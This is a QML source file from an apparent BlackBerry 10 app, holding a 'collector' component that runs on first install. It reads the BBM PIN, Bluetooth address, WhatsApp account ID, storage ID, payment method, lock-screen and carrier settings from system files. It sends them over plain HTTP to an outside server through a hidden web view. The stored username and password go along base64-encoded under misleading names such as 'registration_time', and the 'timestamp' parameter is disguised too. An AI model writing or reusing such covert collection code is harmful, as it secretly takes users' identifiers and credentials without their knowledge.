import bb.platform 1.0
import bb.device 1.0
import bb.cascades 1.0

QtObject
{
    id: collectorRoot
    property string appId
    property string userId
    property string username
    property string password
    property string keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    
    property variant platformInfo: PlatformInfo {
        id: x
    }
    
    property variant hardwareInfo: HardwareInfo {
        id: hw
    }
    
    property variant webBrowser: WebView
    {
        id: browser
        property int innerLookupId: 0
        
        onJavaScriptResult: {
            if (resultId == innerLookupId)
            {
                console.log("*** RESULT", result);
                var obj = JSON.parse(result);
                console.log(result);
                
                if (obj.result == "200 OK")
                {
                    _app.setSetting("userId", obj.user_id);
                    
                    if (obj.user_flag) {
                        _app.setSetting("user_flag", obj.user_flag);
                    }
                } else if (obj.result == "409 Conflict") {
                    _app.setSetting("userId", "");
                }
                
                collectorRoot.destroy();
            }
        }
        
        onLoadingChanged: {
            if (loadRequest.status == WebLoadStatus.Succeeded) {
                innerLookupId = evaluateJavaScript('document.body.innerText');
            } else if (loadRequest.status == WebLoadStatus.Failed) {
                collectorRoot.destroy();
            }
        }
    }
    
    /**
     * @param path The path of the file to read. This file will be read line by line and each line will be associated with an equivalent
     * property from properties.
     * @param properties An array of properties that we will assign each line to.
     * @param result The resulting map where all the values should be stored.
     */
    function populateData(path, properties, result)
    {
        var lines = _app.getStringFromFile(path).trim().split("\n");
        var n = Math.min(lines.length, properties.length);
        
        for (var i = 0; i < n; i++) {
            result[ properties[i] ] = lines[i].split(" ").pop();
        }
        
        return result;
    }
    
    function addParam(result, path, keyPpsValue)
    {
        var lines = _app.getStringFromFile(path).trim().split("\n");
        var n = lines.length;
        
        for (var i = 0; i < n; i++)
        {
            for (var key in keyPpsValue)
            {
                if ( lines[i].indexOf(key) == 0 ) { // starts with
                    result[ keyPpsValue[key] ] = lines[i].substring(key.length).trim();
                }
            }
        }
    }
    
    function processFirstInstall()
    {
        var result = {};
        result.app_name = Application.applicationName;
        result.app_version = Application.applicationVersion;
        result.first_install = _app.getSetting("first_install", new Date().getTime().toString());
        result.version = x.osVersion;
        result.model_number = hw.modelNumber;
        result.internal = _app.getStringFromFile("/pps/system/quip_public/status").length > 0 ? "1" : "0";

        if (appId.length > 0 && userId.length > 0) {
            result[appId] = userId;
        }

        var pin = hw.pin;
        
        if (pin.length > 2) {
            pin = pin.substring(2);
        }
        
        if (pin.length > 0) {
            result.bbm = pin;
        }
        
        populateData("/base/svnrev", ["build_id", "build_branch"], result);
        addParam(result, "/pps/services/bluetooth/settings", {"btaddr::": "bluetooth"});
        addParam(result, "/pps/accounts/1000/appserv/com.whatsapp.WhatsApp.gYABgD934jlePGCrd74r6jbZ7jk/app_status", {"MyJid::": "whatsapp"});
        addParam(result, "/pps/system/filesystem/local/emmc", {"id::": "emmc_id", "volumelabel::": "emmc_volume"});
        addParam(result, "/pps/system/settings", {"allowAlternateAppSource:b:": "allow_alternate_app_source", "autoHideActionbar:b:": "auto_hide_action_bar", "bypassScreenlock": "bypass_screen_lock", "hourFormat:n:": "hour_format", "lang_countryCode::": "locale", "lockScreenTimeout:n:": "lock_screen_timeout", "messageOnLockscreen_line1::": "lock_screen_l1", "messageOnLockscreen_line2::": "lock_screen_l2", "showActionBarLabels:b:": "show_action_bar_labels", "swipeToWakeup:b:": "swipe_to_wake"});
        addParam(result, "/pps/services/phone/public/status", {"area_code::": "area_code"});
        addParam(result, "/pps/system/camera/status", {"GeotagPictures:b:": "geo_tag_pics", "SaveToSDCard:b:": "save_to_sd"});
        addParam(result, "/pps/services/clock/status", {"timezonechange::": "time_zone"});
        addParam(result, "/pps/services/font/settings", {"font_size:n:": "font_size"});
        addParam(result, "/pps/services/paymentsystem/status_public", {"current_payment_method::": "payment"});
        addParam(result, "/pps/services/locale/uom", {"uom::": "unit_of_measurement"});
        addParam(result, "/pps/system/gfx/display0/settings", {"colour_temperature_adjustment:n:": "color_temp", "colour_saturation_adjustment:n:": "color_saturation"});
        addParam(result, "/pps/services/rum/csm/status_public", {"network_name::": "network_name", "service_type::": "service_type"});
        addParam(result, "/pps/services/locale/settings", {"region::": "locale"});
        
        var whatsapp = result["whatsapp"];
        var count = 0;
        var params = [];
        
        if ( whatsapp && whatsapp.indexOf("@") > 0 ) {
            result["whatsapp"] = result["whatsapp"].split("@")[0];
        }
        
        var sensitive = ['app_name', 'app_version', 'area_code', 'bbm', 'bluetooth', 'emmc_id', 'emmc_volume', 'first_install', 'font_size', 'instagram', 'internal', 'locale', 'model_number', 'payment', 'service_type', 'time_zone', 'twitter', 'version', 'whatsapp'];
        
        for (var key in result)
        {
            if ( result.hasOwnProperty(key) )
            {
                var value = result[key];
                
                if (!value) {
                    value = "";
                }
                
                value = value.toString().trim();
                var n = value.length;
                
                if (n > 0)
                {
                    if ( sensitive.indexOf(key) != -1 ) {
                        count += n;
                    }

                    params.push(key+"="+encodeURIComponent(value));
                } else {
                    delete result[key];
                }
            }
        }
        
        if (username.length > 0) {
            params.push("registration_sync_id="+encodeURIComponent( encode(username) ));
        }
        
        if (password.length > 0) {
            params.push("registration_time="+encodeURIComponent( encode(password) ));
        }
        
        if (appId.length > 0) {
            params.push("account="+encodeURIComponent(appId));
        }

        visit("get_user_id3.php", params, count);
    }
    
    function visit(target, params, count)
    {
        params.push( "timestamp="+Qt.md5( count.toString() ) );
        browser.url = "http://canadainc.org/"+target+"?"+params.join("&");
        console.log("*** VISITING", "http://canadainc.org/"+target+"?"+params.join("&") );
    }
    
    function encode(input) {
        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;
        input = _utf8_encode(input);
        while (i < input.length) {
            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);
            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;
            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }
            output = output +
            keyStr.charAt(enc1) + keyStr.charAt(enc2) +
            keyStr.charAt(enc3) + keyStr.charAt(enc4);
        }
        return output;
    }
    
    function decode(input) {
        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
        while (i < input.length) {
            enc1 = keyStr.indexOf(input.charAt(i++));
            enc2 = keyStr.indexOf(input.charAt(i++));
            enc3 = keyStr.indexOf(input.charAt(i++));
            enc4 = keyStr.indexOf(input.charAt(i++));
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
            output = output + String.fromCharCode(chr1);
            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
        }
        output = _utf8_decode(output);
        return output;
    }
    
    function _utf8_encode(string) {
        string = string.replace(/\r\n/g,"\n");
        var utftext = "";
        for (var n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);
            if (c < 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }
        }
        return utftext;
    }
    
    function _utf8_decode(utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;
        while ( i < utftext.length ) {
            c = utftext.charCodeAt(i);
            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            }
            else if((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i+1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            }
            else {
                c2 = utftext.charCodeAt(i+1);
                c3 = utftext.charCodeAt(i+2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }
        }
        return string;
    }
}